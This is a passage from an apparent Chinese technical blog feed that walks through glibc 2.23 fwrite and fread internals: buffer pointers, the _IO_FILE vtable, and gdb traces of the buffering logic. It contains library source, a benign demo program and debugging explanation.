f-&gt;_IO_buf_base);</span><br><span class="line">          <span class="comment">/* #define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="comment">	(fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))*/</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>下面的代码一定要注意，此处是将_IO_write_ptr和_IO_write_base两个指针都初始化为了_IO_buf_base的值，<strong>但_IO_write_end指针却是初始化为了_IO_buf_end</strong>（read的三个相关指针是都被初始化为了_IO_buf_base）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">			   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">     f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">     f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">     f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">     f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">     f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br></pre></td></tr></table></figure>



<p>然后由于当初调用_IO_OVERFLOW函数的时候，第二个参数为EOF</p>
<p><img src="https://s2.loli.net/2022/08/12/KBfmDGZv7RVIsyh.png" alt="image-20220811182225383"></p>
<p>因此_IO_new_file_overflow函数的ch为EOF</p>
<p><img src="https://s2.loli.net/2022/08/12/N1sd9CWzrle6JfZ.png" alt="image-20220811182330917"></p>
<p>所以上面几个指针赋值过后，执行下面if的时候就直接进入了,调用了_IO_do_write函数，注意下_IO_do_write的第三个参数，如果是新创建的reserve area，那么 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base的值则为0的（如下代码）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">	 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>



<p>因为刚才说过，这个to_do其实就是0，因此return返回的时候发现to_do&#x3D;&#x3D;0成立并且后面是||，就直接从_IO_new_do_write函数返回了，并没有去执行后面的new_do_write函数(当时分析到这里，我还不信，于是写了个demo测试了一下发现确实如此(如下图)）<strong>注意:前面讨论的是新创建reserve area执行到这里的情况，如果是输出缓冲有数据的话，来到这里就会执行new_do_write函数，从而触发系统调用write来刷新输出缓冲区(不仅数据被刷新了出去,同时_IO_write_ptr指针也进行了更新)。</strong>总结一下就是_IO_new_do_write函数对输出缓冲区中的数据进行了一个判断，如果存在数据的话就调用write函数来将输出缓冲区中的数据写入文件，否则的话就直接返回。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://s2.loli.net/2022/08/12/EBw1xTPb2yfiCDh.png" alt="image-20220811183408807" style="zoom:50%;" />

<p>然后程序一直返回到_IO_new_file_xsputn函数，接下这段代码实现的是如果要写到文件里的数据大于了reserve area这块区域(通常是0x1000,也就是4k)，那就将大于的部分直接执行系统调用write输出到文件，剩下的部分则写到输出缓冲区中。比如我们要写10k的数据到文件中，而reserve are为4k，那8k的数据都将直接被系统调用write写入文件中，另外2k的数据放到输出缓冲区中。</p>
<p>上述功能的实现核心代码就是这一行<code>do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</code>(不得不说，这一行写的是真巧妙)，如果写入的数据量本身就小于reserve area的话，那do_write就会是0，也就无法进入下面那个if。而if中的new_do_write函数中执行了系统调用write，并且重置了_IO_write_ptr指针(如下图)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">     do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/08/12/z5xYhPaUNspGkmI.png" alt="image-20220812213721975"></p>
<p>这里也就是将大块的数据(大于reserve area的数据)去直接执行系统调用write写入文件，而剩余的小块(小于reserve area的数据)拷贝到输出缓冲区中（下面代码的_IO_default_xsputn函数调用了拷贝函数memcpy）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br></pre></td></tr></table></figure>



<p>_IO_default_xsputn函数的源码如下，这个函数分析起来还是比较简单的。more是我们需要写入文件的字节数，count是输出缓冲区剩余的字节数。如果我们需要写入文件的字节数大于20的话，就执行memcpy函数去拷贝，如果小于20的话，就用for循环一个字节一个字节的拷贝(这个策略应该是效率比较高的)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_default_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      _IO_ssize_t i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后这个函数执行完毕后，整个fwrite函数也就算是结束了。</p>
<h2 id="总结fwrite函数的调用流程："><a href="#总结fwrite函数的调用流程：" class="headerlink" title="总结fwrite函数的调用流程："></a>总结fwrite函数的调用流程：</h2><p>先尝试将数据拷贝到输出缓冲区，如果全部都拷贝过去的话函数就直接返回。如果只拷贝过去了一部分数据，另外一部分数据因为输出缓冲区满的话又或者没有分配reserve area的话都调用_IO_new_file_overflow函数，然后这个函数会新创建一个reserve area或者执行系统调用write刷新输出缓冲区。最后来判断要写入的字节数是否小于reserve area，如果小于的话则将数据拷贝到输出缓冲区中，如果大于的话则将大于部分用系统调用write写入文件剩余部分再拷贝到输出缓冲区。<strong>注意：这个demo程序的话，调试到fwrite函数结束也没有发现系统调用了write，这是因为输出缓冲区将在程序结束时的exit函数中的_IO_cleanup函数调用_IO_flush_all_lockp函数时进行刷新，此时才会执行系统调用write</strong></p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fwrite">FILE结构体及漏洞利用方法 | Hacked By Fish_o0O (fish-o0o.github.io)</a></p>
<p><a href="https://tttang.com/archive/1279/#toc__1">IO FILE之fwrite详解 - 跳跳糖 (tttang.com)</a></p>
<p><a href="http://blog.leanote.com/post/mut3p1g/file-struct"> (leanote.com)</a></p>
]]></content>
      <categories>
        <category>源码调试&amp;&amp;分析</category>
      </categories>
      <tags>
        <tag>源码调试&amp;&amp;分析</tag>
      </tags>
  </entry>
  <entry>
    <title>IO学习--源码分析fread函数</title>
    <url>/posts/323816c7.html</url>
    <content><![CDATA[<p>上一篇分析的是fopen函数，这次来分析下fread函数。<br><a href="https://zikh26.github.io/posts/323816c7.html">IO学习–源码分析fread函数</a></p>
<span id="more"></span>

<h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p>在分析fread函数时，应该先明确一下输入缓冲区是怎么来的。</p>
<p>首先<strong>fread函数会先将数据读到输入缓冲区中，然后从输入缓冲区中执行memcpy函数，拷贝一定字节的数据到我们指定的内存地址上</strong>。而这个输入缓冲区是从哪到哪呢？由两个指针分别声明了这片区域的开始和结束，他们分别叫做<strong>_IO_read_base和_IO_read_end，他们之间的区域就是输入缓冲区</strong>。这样看起来似乎还需要一个输出缓冲区，难道需要malloc申请两个堆块来分别表示输入缓冲区和输出缓冲区么？非也，其实<strong>malloc函数自始至终只申请了一个堆块</strong>，<strong>这个堆块的区域也叫做reserve area</strong>，而_IO_buf_base和_IO_buf_end两个指针则分别声明了这个reserve area的始末。然后将 _IO_read_ptr; _IO_read_end; _IO_read_base;	_IO_write_base;	_IO_write_ptr; _IO_write_end;这六个指针全部初始化为了_IO_buf_base的值，现在的输入缓冲区和输出缓冲区还不存在(因为现在 _IO_read_end和 _IO_read_base的值相同)，以输入缓冲区为例，<strong>读入数据时是执行了系统调用read，而此时的数据是在reserve area中，紧接着 _IO_read_end就会加上刚刚读入的数据的个数，那么此时 _IO_read_end和 _IO_read_base的值变的不同了。而现在这二者之间的区域就成为输入缓冲区</strong>。</p>
<p>再提一下_IO_FILE结构体中的一些指针(如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span> </span><br><span class="line"><span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br></pre></td></tr></table></figure>

<p>其中_<strong>IO_buf_base 和 _IO_buf_end两个指针的作用分别是标明reserve area的始末</strong>。**_IO_read_base 和  _IO_read_end两个指针的作用分别是标明输入缓冲区的始末(write那两个指针同理)<strong>，现在假设有一个30字节的flag文件，然后我连续执行两次fread函数，每次从文件中只读10字节，那么第二次执行fread函数是从哪开始读呢，很明显并不是文件的开始来读取了，而是接着上回fread函数读到的位置，继续读10字节数据。但我们怎么去记录上回fread函数读到哪了呢，这就需要用到</strong>_IO_read_ptr指针了，它是来记录下一次数据应该从输入缓冲区的哪里开始读了。也就是说_IO_read_base 和 _IO_read_ptr 之间的区域是已经使用了的输入缓冲区，而 _IO_read_ptr 和 _IO_read_end之间的区域是输入缓冲区的剩余部分(也就是还未使用部分)**。</p>
<p>通过上面这两段文字，应该可以对刚学习IO的师傅对_IO_FILE结构体中表示缓冲区位置的指针有一些了解了。</p>
<p>同时这次还要提到vtable，它是_IO_FILE_plus结构体中的一个字段，也是一个虚表指针。它指向了_IO_jump_t结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>对于_IO_jump_t结构体，我目前的理解它就是一个跳转表，这里放的都是函数指针。通过不同的偏移获取不同的函数指针，然后将其调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><p><img src="/../img/image-20221007220413772.png" alt="image-20221007220413772"></p>
<p><img src="https://s2.loli.net/2022/08/11/U2BbDW57QiMHZGz.png" alt="image-20220811085348962"></p>
<p>上面第一张图片是fread函数的整体流程，第二张图片是根据我下面写的这个源代码对应的函数调用流程(调试的时候结合这两个图片，可以对自己调试到哪部分有个比较清楚的认知)。</p>
<h2 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(value,<span class="number">1</span>,<span class="number">10</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p>
<h2 id="源码分析-amp-amp-源码调试"><a href="#源码分析-amp-amp-源码调试" class="headerlink" title="源码分析&amp;&amp;源码调试"></a>源码分析&amp;&amp;源码调试</h2><p>先看fread函数源码，发现它的代码很短(如下)，这里主要就是调用了_IO_sgetn函数</p>
<p><img src="https://s2.loli.net/2022/08/11/Py8OzWV5RXhE7vn.png" alt="image-20220810100233854"></p>
<p>查看_IO_sgetn函数后，发现它只调用了vtable中的_IO_XSGETN</p>
<p><img src="https://s2.loli.net/2022/08/11/OGN6ZoP8EyptgmU.png" alt="image-20220810100551020"></p>
<p>然后再溯源的话就是几个宏定义，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta"> (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS) \</span></span><br><span class="line"><span class="meta">			   + (THIS)-&gt;_vtable_offset))</span></span><br></pre></td></tr></table></figure>

<p>我简单分析一下上述部分，核心就是_IO_JUMPS_FUNC(THIS)返回了_IO_jump_t地址，由于JUMP2第一个参数就是__xsgetn，所以-&gt;FUNC访问的就是_IO_jump_t结构体中__xsgetn,然后我们用gdb看下此时的_IO_jump_t结构体中的值(如下)，因此最后我们跳转到了0x7ffff7a86df0处。</p>
<img src="https://s2.loli.net/2022/08/11/YXtvqDUhJs4b3wC.png" alt="image-20220810102706007" style="zoom:50%;" />

<p>然后我们看一下汇编如何实现的这里。</p>
<img src="https://s2.loli.net/2022/08/11/eSmUDlx1iQtk4NG.png" alt="image-20220810103020508" style="zoom:50%;" />

<p>先是让rdi+0xd8指向的内容赋值给了rax寄存器。而<strong>此时的rdi就是_IO_list_all的值</strong>，加上0xd8这个偏移，正好就是_IO_FILE_plus结构体中的vtable字段。加上[]寻址后，也就是拿到了_IO_jump_t结构体的地址。</p>
<p>然后第二条指令是<code>mov    rax, qword ptr [rax + 0x40]</code>，而_IO_jump_t结构体中偏移0x40的字段正好就是__xsgetn(如下图)</p>
<p><img src="https://s2.loli.net/2022/08/11/XMZ3fpkr9HPCUse.png" alt="image-20220810104331302"></p>
<p>最后加上[]寻址，rax为0x7ffff7a86df0(如下图)</p>
<img src="https://s2.loli.net/2022/08/11/KMEgbmJIB2tuXR7.png" alt="image-20220810104747743" style="zoom:50%;" />



<p>如此，最终jmp rax，成功跳转到_IO_file_xsgetn函数(如下图)，而这个_IO_file_xsgetn函数也是fread函数实现的核心函数。</p>
<p><img src="https://s2.loli.net/2022/08/11/nbiIR5wgJdTWEc1.png" alt="image-20220810104948954"></p>
<h3 id="IO-file-xsgetn函数"><a href="#IO-file-xsgetn函数" class="headerlink" title="_IO_file_xsgetn函数"></a>_IO_file_xsgetn函数</h3><p>_IO_file_xsgetn函数主要分为三个部分(下面先是对三个部分的简单概括，后面是对三个部分的具体分析)：</p>
<p>1、先是去判断fp-&gt;_IO_buf_base(reserve area)是否为空，如果为空的话，就说明resever area还没有被分配出来，因此去调用_IO_doallocbuf函数来分配一个reserve area（源码如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>2、如果输入缓冲区剩余的大小不为空，并且还需要读入一定字节的数据，就调用memcpy函数，将输入缓冲区的数据复制到指的的内存处。have为输入缓冲区剩余大小，want为还要读入的字节数。（源码如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">	  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  want = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">	      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	      s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      want -= have;</span><br><span class="line">	      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure>



<p>3、如果输入缓冲区剩余大小为0，并且存在resever area(这片区域就是fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)，且我们需求size比resever area区域小。那么调用__underflow函数执行系统调用read读入一定字节的数据到resever area中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">     &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">continue</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h3 id="分配resever-area"><a href="#分配resever-area" class="headerlink" title="分配resever area"></a>分配resever area</h3><p>先来看第一部分，也就是如果不存在resever area的情况下调用_IO_doallocbuf函数来分配一个resever area。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)<span class="comment">//如果存在resever area(保留区)的话，就直接返回</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)<span class="comment">//调用了vtable中的函数</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为是第一次执行fread函数，所以肯定是会调用_IO_doallocbuf 函数的。通过观察上面的源码和下面的图片发现在这个_IO_doallocbuf函数中又调用了_IO_FILE的vtable中的IO_file_doallocate函数(如下图)</p>
<img src="https://s2.loli.net/2022/08/11/RDSyKFhG6QXtVpN.png" alt="image-20220810172752189" style="zoom:50%;" />



<p>我这里就不放IO_file_doallocate函数的源代码了，调试看一下流程吧。</p>
<img src="https://s2.loli.net/2022/08/11/hLblpx6KDswty73.png" alt="image-20220810174150826" style="zoom:50%;" />

<p>si进入IO_file_doallocate函数后，又调用了vtable中的_IO_file_stat函数。</p>
<img src="https://s2.loli.net/2022/08/11/c8VsSxhIEaXf4LG.png" alt="image-20220810174515007" style="zoom:50%;" />

<p>而后又执行了系统调用fstat，这个系统调用是来获取文件状态，并且初始化st结构体的。可以看到此时的st_blksize为4096(如下图)</p>
<img src="https://s2.loli.net/2022/08/11/9t1UW8wcAHm3fBP.png" alt="image-20220810175134043" style="zoom:50%;" />

<p>而这个st_blksize也就是接下来malloc申请的内存大小（也就是reserve area的大小）</p>
<img src="https://s2.loli.net/2022/08/11/dcANr24xuBPn5jq.png" alt="image-20220810175357303" style="zoom:50%;" />

<p>当malloc函数将内存申请出来后，调用了vtable中的_IO_setb函数(如下)</p>
<img src="https://s2.loli.net/2022/08/11/cULi7ys3RaOpBrv.png" alt="image-20220810175823556" style="zoom:50%;" />

<p>这个函数的代码很短</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过阅读上面的源代码就明白，这个函数主要就是对_IO_buf_base和_IO_buf_end指针进行赋值。至此_IO_doallocbuf函数就结束了。<strong>_IO_doallocbuf函数主要是将resever area申请出来(大小为0x1000),并且对_IO_buf_base和_IO_buf_end指针进行赋值</strong>。</p>
<h3 id="从输入缓冲区中拷贝数据"><a href="#从输入缓冲区中拷贝数据" class="headerlink" title="从输入缓冲区中拷贝数据"></a>从输入缓冲区中拷贝数据</h3><p>第二部分是最简单的，结合下面的源码很容易分析出来，拷贝我们指定的字节的内容从输入缓冲区的剩余部分到指定地址，但如果输入缓冲区剩余大小为空的话，就无法去拷贝。</p>
<p><strong>(have为输入缓冲区剩余大小，want为还要读入的字节数)</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">	  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  want = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">	      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	      s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      want -= have;</span><br><span class="line">	      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure>



